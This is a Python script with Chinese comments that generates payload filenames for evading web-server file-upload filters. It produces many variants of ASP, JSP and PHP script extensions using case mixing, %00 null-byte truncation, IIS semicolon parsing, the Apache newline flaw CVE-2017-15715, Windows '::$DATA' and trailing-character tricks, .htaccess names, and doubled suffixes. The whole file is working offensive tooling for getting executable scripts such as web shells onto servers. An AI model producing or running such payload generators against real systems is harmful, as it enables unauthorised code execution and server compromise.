import copy,urllib.parse

## 各类语言可解析的后缀
asp_parse_suffix = ['asp','aspx','asa','asax','ascx','ashx','asmx','cer','aSp','aSpx','aSa','aSax','aScx','aShx','aSmx','cEr']
jsp_parse_suffix = ['jsp','jspa','jspx','jsw','jsv','jspf','jtml','jSp','jSpx','jSpa','jSw','jSv','jSpf','jHtml']
php_parse_suffix = ['php','php5','php4','php3','php2','pHp','pHp5','pHp4','pHp3','pHp2','html','htm','phtml','pht','pHtml']

## 返回字符串所有大写可能
def str_case_mixing(word):
    str_list = []
    word = word.lower()
    tempWord = copy.deepcopy(word)
    plist = []
    redict = {}
    for char in range( len( tempWord ) ):
        char = word[char]
        plist.append(char) 
    num = len( plist )
    for i in range( num ):
        for j in range( i , num + 1 ):
            sContent = ''.join( plist[0:i] )
            mContent = ''.join( plist[i:j] )
            mContent = mContent.upper()
            eContent = ''.join( plist[j:] )
            content = '''%s%s%s''' % (sContent,mContent,eContent)
            redict[content] = None

    for i in redict.keys():
        str_list.append(i)

    return str_list
## list大小写混合
def list_case_mixing(li):
    res = []
    for l in li:
        res += str_case_mixing(l)
    return res

## 脚本语言漏洞（00截断）
def str_00_truncation(suffix,allow_suffix):
    res = []
    for i in suffix:
        str = '%s%s.%s' % (i,'%00',allow_suffix)
        res.append(str)
        str = '%s%s.%s' % (i,urllib.parse.unquote('%00'),allow_suffix)
        res.append(str)
    return res

## web中间件解析漏洞
def iis_suffix_creater(suffix, allow_suffix):
    res = []
    for l in suffix:
        str ='%s;.%s' % (l,allow_suffix)
        res.append(str)
    return res

def apache_suffix_creater(suffix):
    res = []
    for l in suffix:
        str = '%s.xxx' % l
        res.append(str)
        str = '%s%s' % (l,urllib.parse.unquote('%0a')) #CVE-2017-15715
        res.append(str)
    return res

## 系统特性
windows_os = [' ','.','/','::$DATA','<','>','>>>','%20','%00','%82']
def windows_suffix_creater(suffix):
    res = []
    for s in suffix:
        for w in windows_os:
            str = '%s%s' % (s,w)
            res.append(str)
    return res
# 双后缀
def str_double_suffix_creater(suffix):
	res = []
	str = list(suffix)
	str.insert(1,suffix)
	res.append("".join(str))
	return res
def list_double_suffix_creater(list_suffix):
	res = []
	for l in list_suffix:
		res += str_double_suffix_creater(l)
	return res
#list 去重
def duplicate_removal(li):
    return list(set(li))

def get_filename(language, os, middleware, allow_suffix):
    if middleware==  'iis':
        os = 'win'
    if language == 'asp':
        parse_suffix = asp_parse_suffix
    elif language == 'php':
        parse_suffix =  php_parse_suffix
    elif language == 'jsp':
        parse_suffix = jsp_parse_suffix
    else:
        parse_suffix = asp_parse_suffix + php_parse_suffix + jsp_parse_suffix
    print('[+] 收集%d条可解析后缀完毕' % len(parse_suffix))
    
    # 可解析后缀 + 大小写混合
    if os == 'win' or os == 'all':
        case_parse_suffix = list_case_mixing(parse_suffix)
        print('[+] 加入%d条可解析后缀大小写混合完毕' % len(case_parse_suffix))
    else:
        case_parse_suffix = parse_suffix
        print('[+] Linux不进行大小写混合')
    if middleware == 'iis':
        middleware_parse_suffix = iis_suffix_creater(case_parse_suffix, allow_suffix)
        print('[+] 加入%d条iis中间件解析漏洞完毕' % len(middleware_parse_suffix))
    elif middleware == 'apache':
        middleware_parse_suffix = apache_suffix_creater(case_parse_suffix)
        print('[+] 加入%d条apache中间件解析漏洞完毕' % len(middleware_parse_suffix))
    else:
        middleware_parse_suffix = []
        print('[+] 中间件解析漏洞不需要加入')
    # .htaccess
    if (middleware == 'apache' or middleware == 'all') and (os == 'win' or os == 'all'):
        htaccess_suffix = str_case_mixing(".htaccess")
        print('[+] 加入%d条.htaccess完毕' % len(htaccess_suffix))
    elif (middleware == 'apache' or middleware == 'all') and os == 'linux':
        htaccess_suffix = ['.htaccess']
        print('[+] 加入1条.htaccess完毕')
    else:
        htaccess_suffix = []
    
    # 00截断
    language_parse_suffux = str_00_truncation(case_parse_suffix,allow_suffix)
    print('[+] 加入%d条00截断完毕' % len(language_parse_suffux))
    # 系统特性
    if os == 'win' or os == 'all':
        windows_parse_suffix = windows_suffix_creater(parse_suffix)
        print('[+] 加入%d条系统特性完毕' % len(windows_parse_suffix))
    else:
        windows_parse_suffix = []
    # 双后缀
    double_parse_suffix = list_double_suffix_creater(parse_suffix)
    print('[+] 加入%d条双后缀完毕' % len(double_parse_suffix))
    # 去重
    res = duplicate_removal(case_parse_suffix + language_parse_suffux + middleware_parse_suffix + htaccess_suffix + windows_parse_suffix + double_parse_suffix)
    print('[+] 去重后共%d条' % len(res))
    return res